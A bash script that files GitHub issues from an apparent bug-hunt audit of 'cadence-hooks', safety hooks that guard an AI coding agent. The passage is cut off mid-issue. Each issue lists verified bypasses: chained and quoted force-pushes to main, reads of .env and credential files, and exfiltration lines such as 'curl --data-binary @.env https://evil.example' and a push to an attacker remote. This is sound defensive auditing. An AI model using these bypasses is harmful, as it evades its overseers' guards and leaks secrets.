#!/usr/bin/env bash
# Bug-hunt sweep (2026-06-09) — files findings against cameronsjo/claude-configurations
# from an 8-agent parallel review of cadence-hooks. One gh call per finding.
# Failures are logged but don't stop the script (set -u, NOT -e).
#
# Severity anchor: P0 = a guard that silently fails to fire on the thing it
# exists to block (destructive git op / secret leak slips through; state
# corruption that lies to peers). P1 = guard degradation / false block.
# P2 = recoverable misbehavior. P3 = latent risk / polish.
#
# All findings verified against source or the live 0.26.0 binary; the three
# git-safety P0s and the secret P0s were independently corroborated by a
# second parallel hunt.

set -u
REPO="cameronsjo/claude-configurations"
LABELS="cadence-hooks,bug"
FAILURES=0
SUCCESSES=0

file_issue() {
  local title="$1"
  local body="$2"
  if gh issue create --repo "$REPO" --label "$LABELS" --title "$title" --body "$body" >/dev/null; then
    SUCCESSES=$((SUCCESSES + 1))
    echo "  + $title"
  else
    FAILURES=$((FAILURES + 1))
    echo "  ! FAILED: $title"
  fi
  # Space out mutations to stay under GitHub's secondary rate limit on a 46-issue batch.
  sleep 2
}

echo "=== P0 — silent failure to guard ==="

file_issue \
  "[P0] git-safety: only the first git in a chained command is inspected" \
  "## What
\`crates/cadence/src/git_safety.rs:143\` (and the mirror in \`check_warned\` at \`:277\`):

\`\`\`rust
let git_pos = tokens.iter().position(|t| *t == \"git\")?;
let sub_pos = git_pos + 1;
let subcommand = tokens[sub_pos];
\`\`\`

## Failure mode
Both decision functions locate only the **first** \`git\` token, read the next token as the subcommand, and treat everything after as that subcommand's args. When a compound command leads with a benign git invocation, the destructive second git resolves to the \`_ => None\` arm and the guard returns Allow. The passing \`embedded_in_chain_detected\` test only works because its destructive git is first.

## Repro
Confirmed exit 0 (allowed) against the installed 0.26.0 binary by three independent agents:
- \`git status && git push --force origin main\`
- \`git fetch && git reset --hard origin/main\`
- \`git add -A && git commit -m x && git push --force origin main\`
(\`git push --force origin main\` alone correctly blocks.)

## Fix
Split the command on shell operators (the sibling \`prevent_secret_leaks\` already ships a quote-aware \`split_chain_operators\`) and normalize/evaluate each segment independently, rather than scanning for a single first \`git\`.

## Verify
\`cadence-hooks try cadence git-safety\` with payload \`git status && git push --force origin main\` should exit 2.

## Severity
P0 — the flagship destructive-op guard silently fails to fire on an extremely natural command shape; force-push to main / reset --hard reach execution.

## Related
Same root family as the alias-prefix and quote-tokenization P0s."

file_issue \
  "[P0] git-safety: is_alias_definition exempts the entire command line" \
  "## What
\`crates/cadence/src/git_safety.rs:130-133\` gated at \`:349\`:

\`\`\`rust
fn is_alias_definition(command: &str) -> bool {
    let trimmed = command.trim_start();
    trimmed.starts_with(\"alias \") || trimmed.starts_with(\"git config\") && command.contains(\"alias.\")
}
// run(): if is_alias_definition(command) { return CheckResult::allow(); }
\`\`\`

## Failure mode
The exemption (meant to spare alias *definitions*) tests only the prefix of the full command. Prepending a throwaway \`alias \` token or \`git config … alias.\` and chaining a destructive git op past \`&&\`/\`;\` makes the whole line exempt — \`run\` returns Allow before any normalization.

## Repro
Confirmed exit 0 (allowed):
- \`alias gfp=x && git push --force origin main\`
- \`git config --global alias.co checkout && git reset --hard\`

## Fix
Only exempt when the command is *solely* an alias definition — e.g. confirm there is no operator-separated executable git segment after the alias/config token.

## Verify
\`cadence-hooks try cadence git-safety\` with \`alias x=1 && git push --force origin main\` should exit 2.

## Severity
P0 — a one-token prefix disarms the entire guard; force-push to main reaches execution.

## Related
Same surface as the first-git-only and quote-tokenization P0s."

file_issue \
  "[P0] git-safety: no quote-aware tokenization — sh -c, path/escaped git, and quoted flags evade" \
  "## What
\`crates/cadence/src/git_safety.rs:35\` re-tokenizes with raw \`split_whitespace\`, feeding exact-match comparisons (\`:47\` \`token == \"git\"\`, \`:165-171\` force flags, \`:211\` \`args.contains(&\"--hard\")\`). The quote-aware \`core::shell::tokenize\` (\`crates/core/src/shell.rs:48\`) and \`strip_quotes\` exist but are never used here.

## Failure mode
Quote characters stay glued to tokens and the program token must equal \`git\` exactly, opening several evasions that the real shell still runs.

## Repro
Confirmed against the binary:
- \`sh -c \"git push --force origin main\"\` -> ALLOW (token is \`\"git\`, no bare git found)
- \`eval \"git push --force origin main\"\` -> ALLOW
- \`/usr/bin/git push --force origin main\` -> ALLOW; \`\\\\git push --force origin main\` -> ALLOW; \`\"git\" push --force origin main\` -> ALLOW
- \`git push \"--force\" origin main\` -> ALLOW (force flag not seen)
- \`git push --force origin \"main\"\` -> NUDGE only (quoted branch not protected -> block downgraded to a non-blocking nudge, reset/push still runs)

## Fix
Tokenize with \`core::tokenize\` (strips quotes), resolve the program token by basename (handle \`/path/git\`, leading \`\\\`), and descend into \`sh -c\`/\`bash -c\` payloads before matching.

## Verify
\`cadence-hooks try cadence git-safety\` with \`sh -c 'git push --force origin main'\` should exit 2.

## Severity
P0 — force-push to main reaches execution (or downgrades to a non-blocking nudge) through trivially-typed quoting/wrapping.

## Related
Shares the ad-hoc-parser root cause with the other git-safety P0s."

file_issue \
  "[P0] secret guards: Read/Write/Edit tool path under-matches the .env family vs the Bash path" \
  "## What
\`crates/cadence/src/secret_patterns.rs:59\` (\`is_blocked\`, used by the Read/Grep/Write/Edit handlers) matches the \`.env\` family by **exact** membership:

\`\`\`rust
if BLOCKED_FILENAMES.iter().any(|&p| lower == p) { return true; }
\`\`\`

\`BLOCKED_FILENAMES\` (\`:18-35\`) lists \`.env.production\`/\`.env.development\` but not the ubiquitous \`.env.prod\`/\`.env.dev\`, \`.env.development.local\`, \`.envrc\`, \`.env.docker\`, etc. The Bash path instead uses \`is_dangerous_env_operand\` (\`prevent_secret_leaks.rs:22-28\`, substring \`.contains(\".env\")\` minus safe suffixes).

## Vulnerability
The most natural ingestion tool (Read) and the write tools are the **weakest** check. Reproduced against the binary: \`Read .env.prod\` -> exit 0 while \`cat .env.prod\` -> exit 2; \`Write .env.prod\` -> exit 0. \`.envrc\` (direnv, routinely holds export AWS_SECRET_ACCESS_KEY=…) reads straight into context via the Read tool.

## Repro
Read tool on \`/project/.envrc\`, \`/project/.env.development.local\`, or \`/project/.env.prod\` -> Allow. Compare \`cat .envrc\` -> Block.

## Fix
Have the \`.env\` family in \`is_blocked\` use the same substring-minus-safe-suffix predicate the Bash path already implements, so the four tool handlers and Bash agree.

## Verify
\`cadence-hooks try cadence prevent-secret-leaks\` with a Read of \`.env.prod\` should exit 2.

## Severity
P0 — secret-file contents read/written through the primary tools the agent actually uses, while the Bash equivalent blocks.

## Related
Compounds with the read_operand and reader-verb P0s."

file_issue \
  "[P0] prevent-secret-leaks: read_operand parses only the first non-flag token — head -n N, multi-file, and redirects bypass" \
  "## What
\`crates/cadence/src/prevent_secret_leaks.rs:12-19\`:

\`\`\`rust
fn read_operand(command: &str, cmd_prefix: &str) -> Option<String> {
    let lower = command.to_lowercase();
    let after = lower.split(cmd_prefix).nth(1)?;
    after.split_whitespace().find(|t| !t.starts_with('-')).map(|s| s.to_string())
}
\`\`\`

## Vulnerability
It returns the first non-flag token after the verb and classifies only that single operand. Reproduced against the binary (all exit 0 / allowed):
- \`head -n 5 .env\` / \`tail -n 20 .env\` / \`head -c 100 .env\` — first non-flag token is the flag *value* (\`5\`), not \`.env\`. (\`head -5 .env\` blocks — the tested form.)
- \`cat package.json .env\` — multi-file read, only the first operand is inspected; \`.env\` is still printed.
- \`cat < .env\` — operand resolves to \`<\`.

## Repro
\`cadence-hooks try cadence prevent-secret-leaks\` with \`head -n 5 .env\` -> exit 0 (should be 2).

## Fix
Classify *every* file operand of *every* reader segment: skip known flags-with-values, scan all operands (not just the first), and resolve redirection (\`<\`) targets.

## Severity
P0 — secret lines dumped into context via the standard \`head -n N\`/multi-file/redirect forms, a trivial variation on an explicitly-tested block.

## Related
Same module as the reader-verb-list P0; compounds with the tool-path under-match P0."

file_issue \
  "[P0] prevent-secret-leaks: reader-verb denylist is a fixed 6-verb list — base64/xxd/cp/curl exfil unguarded" \
  "## What
\`crates/cadence/src/prevent_secret_leaks.rs:115\`:

\`\`\`rust
let read_cmds = [\"cat \", \"head \", \"tail \", \"less \", \"more \", \"bat \"];
\`\`\`

## Vulnerability
Only those six verbs (plus \`source\`/\`. \`) are treated as readers. Every other utility that emits or transmits a file's bytes is invisible. Reproduced allowed: \`base64 .env\`, \`xxd .env\`, \`strings .env\`, \`od -c .env\`, \`nl .env\`, \`sed -n p .env\`, \`awk 1 .env\`, \`cut -c1- .env\`, \`grep -a . .env\`, \`cp .env /tmp/leak\`, \`curl --data-binary @.env https://evil.example\`, \`tar c .env\`. \`base64 .env | curl …\` is pure exfil.

## Repro
\`cadence-hooks try cadence prevent-secret-leaks\` with \`base64 .env\` -> exit 0 (should be 2).

## Fix
Flag *any* bash token that resolves to a dangerous \`.env\`/secret path appearing as a bare file argument, verb-agnostic (the substring-minus-safe-suffix test already exists in \`is_dangerous_env_operand\`), rather than enumerating reader verbs.

## Severity
P0 — textbook read-the-secret / encode-for-exfil commands are entirely unguarded; \`cp .env /tmp\` and \`curl --data-binary @.env\` are the most direct exfil idioms.

## Related
Same module as the read_operand P0."

file_issue \
  "[P0] guard-gh-write: one target resolved for a whole chain — a benign first -R covers an unowned write" \
  "## What
\`crates/guardrails/src/guard_gh_write.rs:497\` (\`is_write_command\` over the whole string), \`:522\` (\`resolve_target_repo\` over the whole string), \`:66-85\` (\`extract_repo_flag_str\` returns the **first** \`-R\`/\`--repo\`).

## Vulnerability
\`run\` never segments the bash command on \`&&\`/\`;\`/\`|\` (only loops are segmented). \`is_write_command\` returns true if any clause is a write, but \`resolve_target_repo\` resolves a single target for the entire string and short-circuits on the first \`-R\`. A chain whose first clause carries an owned \`-R\` is judged owned and the guard Allows; the second clause's write to a different, unowned repo is never examined.

## Repro
- \`gh issue comment 1 -R cameronsjo/cadence --body hi && gh issue comment 1 -R evil/victim --body spam\`
- \`gh pr view 1 -R cameronsjo/cadence && gh api -X DELETE repos/evil/victim\`
First \`-R cameronsjo/cadence\` resolves -> is_allowed -> \`allow()\`.

## Fix
Segment the command on chain operators and resolve+authorize the target for *each* gh write clause independently (as loop analysis already does for loops).

## Severity
P0 — a gh write/delete against an unauthorized repo reaches execution behind a benign first clause.

## Related
Compounds with the gh api graphql/orgs cwd-fallback P1 and the api-DELETE-repo P2."

file_issue \
  "[P0] guard-push-remote: git push <URL> <refspec> bypasses ownership and falls back to origin" \
  "## What
\`crates/guardrails/src/guard_push_remote.rs:51-74\` (\`extract_remote\`) and \`:38-48\` (\`resolve_push_url\`):

\`\`\`rust
// extract_remote: candidate must be a known 'git remote' NAME, else returns None
// resolve_push_url(work_dir, None): falls back to branch tracking remote -> origin
\`\`\`

## Vulnerability
When the push target is a URL rather than a named remote, \`extract_remote\` finds it is not a known remote name and returns \`None\`. \`run\` (\`:217-218\`) then calls \`resolve_push_url(work_dir, None)\`, which resolves the branch's tracking remote — \`origin\` — and \`check_owner\` validates **origin** (owned) instead of the URL. The arbitrary push URL is dropped on the floor; \`run\` returns \`allow()\` at \`:261\`.

## Vulnerability impact
\`git push https://evil.com/attacker/exfil.git HEAD:main\` (or the SCP form \`git push git@evil.com:attacker/exfil.git main\`) from any repo whose origin is owned pushes the branch to an attacker-controlled remote, unguarded. Verified at source.

## Fix
When the push argument parses as a URL, run \`check_owner\` on *that* URL (via \`host_and_repo_from_url\`) rather than discarding it and resolving origin.

## Verify
\`cadence-hooks try guardrails guard-push-remote\` with \`git push https://evil.com/a/b.git HEAD:main\` (CADENCE_ALLOWED_OWNERS set) should block.

## Severity
P0 — work pushed to an unowned/attacker remote, irrecoverable — the worst-case ownership-guard miss.

## Related
Sibling of the gh-write chain P0."

file_issue \
  "[P0] session: stale-sweep deletes a live-but-quiet session's record and declared lanes" \
  "## What
\`crates/session/src/registry.rs:157-172\` (\`sweep_stale\`, \`let _ = fs::remove_file(&path);\`) + \`start.rs:55-74\` (sweep runs *before* \`read_own\`) + \`registry.rs:144-151\` (\`touch_own\` None-arm rebuilds a minimal record).

## Failure mode
Liveness is file mtime, refreshed only by the heartbeat, which (per cadence-canon hooks.json) fires **only** after \`git *\` Bash and \`Edit\`/\`Write\` — not Read/Grep/Glob/non-git Bash. A session in a read/investigate phase or paused on the user for >10 min (\`DEFAULT_STALE_MINUTES = 10\`) bumps no mtime though it is alive. \`sweep_stale\` deletes its file unconditionally. Because \`run_start\` sweeps before \`read_own\`, a session can even sweep its own file on \`/clear\`/compaction and re-register stripped of its declared \`intent\`/\`touching\`.

## Repro
Session A: \`session declare --touching crates/session/\`, then 10+ min in Read/Grep/test loops with no git op. Session B compacts (SessionStart) -> sweeps A's stale file -> A is absent from B's disclosure and A's lanes are gone.

## Fix
Refresh mtime on more signals (or a periodic touch), and never sweep before reading own state; distinguish 'no recent edit' from 'dead'.

## Severity
P0 — a live peer is pruned (disclosure and \`session status\` say it is gone) and its declared lanes vanish, so the lane-overlap guard can no longer warn anyone editing into them -> unwarned stomp.

## Related
Compounds with the heartbeat-drift P0 and the MultiEdit lane-bypass P1."

file_issue \
  "[P0] session: heartbeat absorbs peer-induced branch drift, defeating warn-branch-drift" \
  "## What
\`crates/session/src/heartbeat.rs:35\` records live HEAD (\`git branch --show-current\`); \`registry.rs:136-153\` (\`touch_own\`) overwrites the recorded branch whenever it differs. \`branch_drift.rs:6-9\` rests on the (false) invariant that \`recorded == current\` for this session's own checkouts.

## Failure mode
The heartbeat cannot distinguish *your* branch switch from a *peer's*; it records both. Per hooks.json it fires after every git op and Edit/Write, so a peer's \`git checkout\` is absorbed into your \`recorded\` baseline by your very next \`git add\`/\`git status\`/Edit. At commit time \`assess_branch_drift\` sees \`current == recorded\` and returns \`allow()\` — no warning. The guard fires only in the rare zero-intervening-op window.

## Repro
Peer switches shared HEAD feat/x -> main. You run any git op or Edit (heartbeat records main). You \`git commit\`. Drift check: current main == recorded main -> silent.

## Fix
Record the drift baseline at a point the session controls (e.g. on its own explicit checkout), not on every heartbeat; or compare against last-*declared* branch rather than last-observed HEAD.

## Severity
P0 — your commit lands on a branch a peer switched you onto, unwarned — the exact lost-work-in-a-shared-checkout scenario this guard exists to prevent.

## Related
Compounds with the stale-sweep P0."

echo ""
echo "=== P1 — guard degradation / false block ==="

file_issue \
  "[P1] git-safety: force/protected-branch matching is exact-only (--force-with-lease=ref, refs/heads/main, HEAD slip to nudge)" \
  "## What
\`crates/cadence/src/git_safety.rs:165-171\` (force flags exact-match) and \`:102-104\`/\`:176-178\` (\`is_protected_branch\` exact \`== main/master\`; standalone targets never strip \`refs/heads/\`).

## Failure mode
- \`--force-with-lease=<ref>\` is a single token \`--force-with-lease=origin/main\`, not equal to \`--force-with-lease\`, and \`short_flags_contain\` bails on \`--\` — so the force flag is not seen.
- A standalone target \`refs/heads/main\`, or \`HEAD\` (which on a checked-out main *is* main), is not recognized as protected -> with \`--force\` present the code falls through to the warn arm and downgrades the hard block to a non-blocking nudge.

## Repro (verified)
- \`git push --force-with-lease=origin/main origin main\` -> ALLOW
- \`git push --force origin refs/heads/main\` -> NUDGE (runs)
- \`git push --force origin HEAD\` -> NUDGE (runs)

## Fix
Match any token whose flag-name prefix (before \`=\`) is a force flag; strip \`refs/heads/\` from standalone targets and treat \`HEAD\` as protected when it cannot be proven non-main.

## Severity
P1 — force-push to main downgraded from a hard block to a soft nudge (it still executes) via these spellings.

## Related
Adjacent to the quote-tokenization P0."

file_issue \
  "[P1] git-safety: unlisted git global flags hide the subcommand from the normalizer" \
  "## What
\`crates/cadence/src/git_safety.rs:55-89\` (\`normalize_git_command\`) strips only a 6-entry global-flag allowlist (\`:19-22\`: \`-C\`, \`--git-dir\`, \`--work-tree\`, \`--no-pager\`, \`--no-optional-locks\`, \`--bare\`).

## Failure mode
Any leading global flag not on the list is not stripped, so the loop sets \`seen_subcommand = true\` on the flag itself and the real subcommand is missed. \`check_blocked\` then reads the flag as the subcommand -> \`_ => None\`.

## Repro (verified)
- \`git -p reset --hard\` (\`-p\` = \`--paginate\`) -> ALLOW
- \`git --literal-pathspecs push --force origin main\` -> ALLOW
- \`git --no-replace-objects clean -fd\` -> ALLOW

## Fix
Don't enumerate global flags; instead treat the first token after \`git\` that is not a \`-\`-prefixed flag (consuming known flags-with-args) as the subcommand.

## Severity
P1 — force-push / reset --hard / clean -fd execute unblocked behind any non-allowlisted leading global flag.

## Related
Same normalizer surface as the quote-tokenization P0."

file_issue \
  "[P1] git-safety: git checkout . and git restore . discard all changes but are unguarded" \
  "## What
\`crates/cadence/src/git_safety.rs:217-223\` (\`check_checkout_blocked\` requires BOTH \`--\` and \`.\`); no \`restore\` arm exists in the block (\`:151-161\`) or warn (\`:285-327\`) dispatch.

## Failure mode
The discard-all block fires only when args contain both \`--\` and \`.\`. The far more common \`git checkout .\` (no \`--\`) discards every unstaged change and is neither blocked nor warned. The modern equivalent \`git restore .\` has no handler at all.

## Repro
\`git checkout .\` / \`git restore .\` / \`git restore --worktree --staged .\` -> Allow (while \`git checkout -- .\` blocks, per test \`checkout_dot_blocked\`).

## Fix
Block \`checkout .\`/\`checkout <pathspec>\` discard-all forms (with or without \`--\`) and add a \`restore\` handler for the worktree-discard cases.

## Severity
P1 — wholesale discard of uncommitted working-tree changes executes unblocked; the near-identical \`checkout -- .\` is blocked, so this is an inconsistent miss of the same destructive intent.

## Related
git-safety missing-handler family."

file_issue \
  "[P1] git-safety: git rebase --onto main <upstream> <branch> is falsely blocked" \
  "## What
\`crates/cadence/src/git_safety.rs:263-272\` (\`check_rebase_blocked\` blocks if any non-flag arg equals \`main\`/\`master\`).

## Failure mode
\`git rebase --onto main <upstream> <branch>\` rebases the named branch ONTO main and does not modify main at all, but the check blocks it as 'Rebase onto protected branch'. This is a documented Cameron workflow (both CLAUDE.md files show \`git rebase --onto main <old-base-tip> <branch>\` for restacking squash-merged PRs). (Inconsistently, \`git rebase origin/main\` escapes because \`\"origin/main\" != \"main\"\`.)

## Repro
\`git rebase --onto main feature~3 feature\` -> hard block (exit 2).

## Fix
Treat the argument following \`--onto\` as a rebase *destination* (safe), distinct from a rebase *upstream* that rewrites onto a protected branch.

## Severity
P1 — false block forces the cherry-pick workaround for a safe, documented stacked-PR operation.

## Related
False-block class (cf. memory_guard over-match, terminology over-exclude)."

file_issue \
  "[P1] prevent-secret-writes: redirect_target inspects only the first redirect — stderr/chained/quoted/>| bypass" \
  "## What
\`crates/cadence/src/prevent_secret_writes.rs:11-22\` (\`redirect_target\`) scans the raw, non-quote-stripped string for the first \`>>\` (else first \`>\`) and inspects that single token.

## Failure mode (all verified allowed)
- \`echo SECRET 2>/dev/null > .env\` — first \`>\` belongs to \`2>/dev/null\`, returns \`/dev/null\`.
- \`echo a > ok.txt && echo K=v > .env\` — only the first redirect (\`ok.txt\`) is checked.
- \`echo \"a > b\" > .env\` — the quoted decoy \`>\` is found first.
- \`echo x >| .env\` — after the first \`>\`, the next token is \`|\`.

## Fix
Quote-strip first, then scan *all* redirect operators (\`>\`, \`>>\`, \`>|\`, fd-prefixed \`N>\`), classifying every target.

## Severity
P1 — a secret-file write/overwrite slips past the block via standard redirect shapes.

## Related
Same module as the non-redirect-writer P1."

file_issue \
  "[P1] prevent-secret-writes: ignores every non-redirect/non-rm writer (tee, cp, mv, dd, install, truncate)" \
  "## What
\`crates/cadence/src/prevent_secret_writes.rs:53-75\` (\`bash_targets_env_file\` consults only \`redirect_target\` + \`rm_targets\`). The gap is acknowledged-but-unfixed in tests (\`:351-363\`, \`:547-551\`).

## Failure mode
Any command that creates/overwrites a file other than via \`>\`/\`>>\`/\`rm\` is unseen: \`printf 'API_KEY=live' | tee .env\`, \`cp /tmp/x .env\`, \`mv staged .env\`, \`dd of=.env\`, \`install -m600 src .env\`, \`truncate -s0 .env\`.

## Fix
Model the file-writing verbs (tee/cp/mv/dd/install/truncate) and classify their destination operands, or check any \`.env\`-resolving operand in a writeful command.

## Severity
P1 — a real secret is materialized into \`.env\` via \`tee\`/\`cp\` with no guard reaction.

## Related
Same module as the redirect_target P1; mirrors the leak-side reader-verb P0."

file_issue \
  "[P1] secret-patterns: deny-set omits high-value plaintext-credential files" \
  "## What
\`crates/cadence/src/secret_patterns.rs:18-35\` (\`BLOCKED_FILENAMES\`) and \`:44\` (\`BLOCKED_PATH_FRAGMENTS\`).

## Failure mode
Well-known plaintext-credential files are in neither list, so neither Read nor Bash blocks them: \`~/.aws/credentials\` (bare \`credentials\`; the list only has \`credentials.json\`), \`.git-credentials\` (plaintext \`https://user:token@host\`), \`.pgpass\`, \`.kube/config\`, and \`.envrc\`. The \`.envrc\` gap is pointed — the block messages tell the user 'secrets are available via direnv', yet direnv's own secret-bearing config is readable.

## Fix
Add \`.aws/credentials\`, \`.git-credentials\`, \`.pgpass\`, \`.kube/config\`, \`.envrc\` (and their path fragments) to the deny-set — a closed, addable list.

## Severity
P1 — AWS keys, git tokens, Postgres passwords, and kube creds are exactly what this guard exists to protect.

## Related
Compounds with the tool-path under-match P0."

file_issue \
  "[P1] guard-gh-write: gh api graphql / orgs / user writes fall back to the cwd remote and are allowed from any owned dir" \
  "## What
\`crates/guardrails/src/guard_gh_write.rs:44-45\` (\`API_REPOS\` only matches \`repos/owner/repo\`) and \`:147-157\` (falls through to \`resolve_from_git_remotes(work_dir)\`).

## Vulnerability
\`resolve_target_repo\` can extract an owner only from \`-R\`, a \`gh repo <sub>\` positional, or a literal \`repos/owner/repo\` path. A GraphQL mutation (\`gh api graphql -f query='mutation{…}'\`, still detected as a write by \`API_FIELD_FLAGS\`), \`gh api -X POST orgs/<org>/repos\`, or \`gh api … user/…\` matches none of those, so resolution falls to the cwd's \`origin\`. Run inside any owned repo checkout, the target resolves to that owned repo and the write is allowed though the actual call targets an arbitrary org/repo/node.

## Repro
From an owned repo dir: \`gh api graphql -f query='mutation { addStar(input:{starrableId:\"<node>\"}){clientMutationId} }'\` or \`gh api -X POST orgs/evil-org/repos -f name=x\`.

## Fix
When the target cannot be resolved to a concrete owned repo (graphql/orgs/user paths), treat it as Unresolvable and block, rather than falling back to the cwd remote.

## Severity
P1 — unguarded GitHub mutations against arbitrary owners whenever the session runs from an owned repo dir.

## Related
Compounds with the gh-write chain P0."

file_issue \
  "[P1] session: non-atomic registry writes — a torn read makes a live peer invisible" \
  "## What
\`crates/session/src/registry.rs:123\` (\`fs::write(path, json + \"\n\")\` = O_TRUNC then write_all, no temp+rename) vs \`:76-79\` (\`read_peers\` does \`fs::read_to_string\` then \`from_str\`, with \`else { continue; }\` fail-open).

## Failure mode
There is a window where the file is truncated to 0 bytes or partially written. A concurrent peer's single read can land inside that window, \`from_str\` fails, and the peer is silently skipped. The one-shot SessionStart disclosure is the worst exposure: miss the peer once and it is never disclosed for the session.

## Repro
Peer is actively heartbeating (rewrites its file on every git op/Edit). You hit SessionStart; \`read_peers\` reads the peer's file inside its truncate-then-write window -> parse fails -> peer dropped.

## Fix
Write to a temp file in the same dir, then \`fs::rename\` (atomic on the same filesystem) so readers only ever see a complete document.

## Severity
P1 — a live peer omitted from the disclosure / lane guard; the fail-open 'unparsable = absent' path applied to a *live* peer.

## Related
Concurrency-without-locks family with the stale-sweep P0."

file_issue \
  "[P1] session: lane guard ignores MultiEdit, missing real lane overlaps" \
  "## What
\`crates/session/src/guard.rs:83\` matches only \`Some(\"Edit\") | Some(\"Write\")\`; the cadence-canon hooks.json PreToolUse matcher is \`Edit|Write\`.

## Failure mode
\`MultiEdit\` is a first-class file-mutation tool carrying a \`file_path\`, but it is neither wired nor matched, so a \`MultiEdit\` into a peer's declared \`touching\` lane is never assessed. (Bash file mutations like \`sed -i\`/\`cat >\` similarly bypass.)

## Repro
Peer declares \`touching: [\"crates/session/\"]\`. You \`MultiEdit crates/session/src/registry.rs\` -> no nudge, though an \`Edit\` to the same path would flag.

## Fix
Add \`MultiEdit\` to both the guard's match arm and the hooks.json matcher.

## Severity
P1 — a real lane overlap via a common editing tool goes unwarned -> stomp.

## Related
Mirrors the content-validator MultiEdit bypass."

file_issue \
  "[P1] guard-op-vault-scan: global flags between op and the subcommand evade the enumeration regex" \
  "## What
\`crates/guardrails/src/guard_op_vault_scan.rs:16\`: \`Regex::new(r\"\bop\s+(item|vault)\s+list\b\")\` requires \`item\`/\`vault\` to immediately follow \`op\`.

## Failure mode
The \`op\` CLI supports global flags before the subcommand, and every such form enumerates the vault while slipping past the guard. Verified ALLOW: \`op --format json item list\`, \`op --format=json item list | grep api\`, \`op --account my.1password.com item list\`, \`op --cache item list\`, \`op --session abc item list | awk …\`. These flag-prefixed forms are the normal way scripts call \`op\`.

## Repro
\`op --format json item list | grep token\` -> Allow (should block).

## Fix
Match \`op\` followed by any run of global flags, then \`item|vault list\` — or tokenize and look for the \`item|vault list\` subcommand regardless of intervening flags.

## Severity
P1 — the vault-enumeration guard silently fails on the most common real invocation shapes (and the scan it allows trips the auto-mode classifier the guard exists to prevent).

## Related
Regex-too-tight family with the gh-dangerous api-DELETE P2."

file_issue \
  "[P1] obsidian trash_guard: quoted absolute vault paths evade the path-argument check" \
  "## What
\`crates/obsidian/src/trash_guard.rs:38\` (\`for part in command.split_whitespace()\`) + \`:13-19\` (\`looks_absolute\` checks \`starts_with('/')\`). Uses raw \`split_whitespace\`, not the quote-aware \`core::shell::tokenize\`; \`normalize_path\` does not strip quotes.

## Failure mode
When cwd is outside the vault, in-vault detection scans command tokens. A quoted path \`\"/vault/note.md\"\` becomes the token \`\"/vault/note.md\` (leading quote) -> \`looks_absolute\` false -> not flagged. Vault paths routinely contain spaces (e.g. \`Field Reports/…\`), which an agent *must* quote, and \`split_whitespace\` additionally shreds the quoted path across tokens. Cameron works from \`~/Projects/...\` while vault files live elsewhere, so 'cwd outside vault' is the common case.

## Repro
From a cwd outside the vault: \`rm \"/Users/cameron/Vault/Field Reports/old.md\"\` -> Allow (unrecoverable delete).

## Fix
Tokenize with \`core::tokenize\` (quote-aware) and strip quotes in \`normalize_path\` before the absolute/in-vault test.

## Severity
P1 — the vault-deletion guard fails to fire on the destructive op it exists to catch whenever the path is quoted.

## Related
Same guard as the non-rm-verb P3."

file_issue \
  "[P1] content validators: MultiEdit silently bypasses terminology, orphaned-todos, and line-endings guards" \
  "## What
\`crates/cadence/src/terminology.rs:150\`, \`crates/cadence/src/block_orphaned_todos.rs:85\`, \`crates/cadence/src/validate_line_endings.rs:28\` all gate on:

\`\`\`rust
let Some(content) = input.content() else { return CheckResult::allow(); };
\`\`\`

Root cause: \`crates/core/src/lib.rs:231\` — \`content()\` returns \`ti.content.as_deref().or(ti.new_string.as_deref())\`, which is \`None\` for a MultiEdit payload (MultiEdit carries \`edits[]\`, never top-level \`content\`/\`new_string\`).

## Failure mode
These three guards were never migrated to the 0.16.0 \`effective_content()\` simulation (which the frontmatter validator uses and which *does* handle \`edits[]\`). For any MultiEdit, \`content()\` is \`None\`, so each guard hits its early \`allow()\` and inspects nothing. The frontmatter validator's own \`Edit|Write\` matcher + \`make_multi_edit\` tests prove MultiEdit reaches guards sharing that matcher (the unanchored \`Edit\` substring matches \`MultiEdit\`); the cadence guards share it and wave MultiEdit through.

## Repro
A \`MultiEdit\` on any non-excluded file whose \`edits[].new_string\` introduces a prohibited term, an orphaned task marker with no issue ref, or a CRLF byte into a \`.sh\` file -> Allow (the guard never inspects the edit). Payload carries \`edits[]\` rather than a top-level \`new_string\`.

## Fix
Terminology must fold \`edits[]\` new/old strings into its introduced-vs-existing diff; orphaned-todos and line-endings (whole-fragment checks) can move to \`effective_content()\`.

## Severity
P1 — three hard-block guards silently fail to fire the moment the edit arrives as MultiEdit instead of Edit. (Rated P1 rather than P0 because the bypassed checks cover terminology/markers/line-endings, not destructive or secret operations.)

## Related
Same content() vs effective_content() root cause as the memory_guard fragment-count P2 and the security-patterns P3; mirrors the session lane-guard MultiEdit bypass P1."

echo ""
echo "=== P2 — recoverable misbehavior ==="

file_issue \
  "[P2] git-safety: missing handlers for filter-branch, filter-repo, update-ref, and push --mirror" \
  "## What
\`crates/cadence/src/git_safety.rs:151-161\` (block dispatch) and \`:285-327\` (warn dispatch) have no arms for \`filter-branch\`, \`filter-repo\`, \`update-ref\`, or \`push --mirror\` (\`check_push_blocked\` only looks for force/delete/colon-refspec).

## Failure mode
\`git filter-branch …\`/\`git filter-repo …\` rewrite entire history; \`git update-ref -d refs/heads/main\` deletes the main ref locally; \`git push --mirror origin\` overwrites/deletes remote refs (including protected branches). All fall through to \`None\` -> Allow.

## Repro
\`git filter-repo --invert-paths --path secrets\`; \`git update-ref -d refs/heads/main\`; \`git push --mirror origin\`.

## Fix
Add block/warn handlers for these history-rewrite and remote-destructive subcommands/flags.

## Severity
P2 — full history rewrites and remote-mirror overwrites execute unguarded; lower hit-rate than the chained-push P0s because these verbs are rarely emitted naturally.

## Related
git-safety coverage family."

file_issue \
  "[P2] secret guards: no secret-content detection — secret_patterns is filename-only" \
  "## What
\`crates/cadence/src/secret_patterns.rs\` (entire module is filename/extension/path-fragment based — no content regex). \`prevent_secret_writes.rs:85-114\` classifies solely on \`file_path\` and never calls \`effective_content()\`.

## Failure mode
A real credential placed into a normally-named, tracked file is never seen: \`Write src/config.ts\` containing \`AKIA…\`/\`ghp_…\`/\`sk-…\`, or \`echo \"AKIA… / wJalr…\" >> README.md\`, or a PEM private key into \`notes.md\`. The exfil-via-echo nudge (\`prevent_secret_leaks.rs:173-182\`) is also case-sensitive on uppercase \`KEY/SECRET/TOKEN/…\`, so \`echo \$database_password\` (lowercase) is missed.

## Failure mode (coverage)
Despite the module name, there is no AWS/GitHub-PAT/\`sk-\`/PEM/JWT/Slack value scanner to audit at all.

## Fix
Add a content scanner (over \`effective_content()\`) for high-confidence secret value patterns, on the write path at minimum.

## Severity
P2 — real secret values land in tracked files (the P0 outcome the framing names), but closing it is a feature (content scanning) rather than a parser fix, and filename-based protection still covers the named-secret-file case.

## Related
